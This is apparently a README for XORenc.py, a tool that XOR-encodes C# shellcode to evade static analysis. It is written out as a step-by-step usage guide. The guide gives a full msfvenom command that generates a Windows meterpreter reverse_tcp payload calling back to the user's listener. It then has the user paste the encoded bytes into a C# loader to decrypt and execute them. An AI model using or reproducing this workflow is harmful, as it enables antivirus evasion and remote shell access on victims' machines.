This script encrypts C# shellcode using a random single-byte XOR key, providing lightweight obfuscation against basic static analysis.
Features:

✅ Generates a random XOR key for every execution.
✅ Encodes shellcode using XOR obfuscation.
✅ Formats output as a C# byte array for seamless integration.
Usage Example

1️⃣ Generate Shellcode (C# Format)

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f csharp

2️⃣ Copy Shellcode

    Copy the byte array inside {} from msfvenom output.
    Paste it into buf in XORenc.py.

3️⃣ Run the Encryption Script

python3 XORenc.py

4️⃣ Copy the XOR Key & Encrypted Shellcode

    Paste them into your C# loader for decryption & execution.

